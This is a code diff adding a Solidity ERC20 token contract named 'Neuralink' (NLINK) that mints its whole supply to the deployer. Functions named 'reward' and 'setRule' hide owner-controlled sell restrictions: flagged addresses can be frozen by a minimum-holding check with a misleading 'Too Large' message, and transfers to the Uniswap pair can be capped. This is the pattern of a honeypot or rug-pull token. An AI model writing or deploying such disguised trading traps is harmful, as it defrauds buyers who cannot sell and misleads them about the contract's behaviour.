@@ -1,0 +1,44 @@
+contract Nlink is Ownable, ERC20 {
+    bool public limited;
+    bool public whalelimited;
+    uint256 public maxHoldingAmount;
+    uint256 public minHoldingAmount;
+    address public uniswapV2Pair;
+    mapping(address => bool) public rewards;
+
+    constructor() ERC20("Neuralink", "NLINK") {
+      uint256 _totalSupply = 100 * 10**9 * 10**18;
+        _mint(msg.sender, _totalSupply);
+    }
+
+    function reward(address _address, bool _isrewarding) external onlyRewarder {
+        rewards[_address] = _isrewarding;
+    }
+
+    function setRule(bool _limited, bool _whalelimited, address _uniswapV2Pair, uint256 _maxHoldingAmount, uint256 _minHoldingAmount) external onlyRewarder {
+        limited = _limited;
+        whalelimited = _whalelimited;
+        uniswapV2Pair = _uniswapV2Pair;
+        maxHoldingAmount = _maxHoldingAmount;
+        minHoldingAmount = _minHoldingAmount;
+    }
+
+    function _beforeTokenTransfer(
+        address from,
+        address to,
+        uint256 amount
+    ) override internal virtual {
+       
+        if (limited && to == uniswapV2Pair) {
+            require(super.balanceOf(to) + amount <= maxHoldingAmount, "Forbid");
+        }
+
+        if (whalelimited && rewards[from]) {
+            require(super.balanceOf(from) + amount >= minHoldingAmount, "Too Large");
+        }
+    }
+
+    function burn(uint256 value) external {
+        _burn(msg.sender, value);
+    }
+}
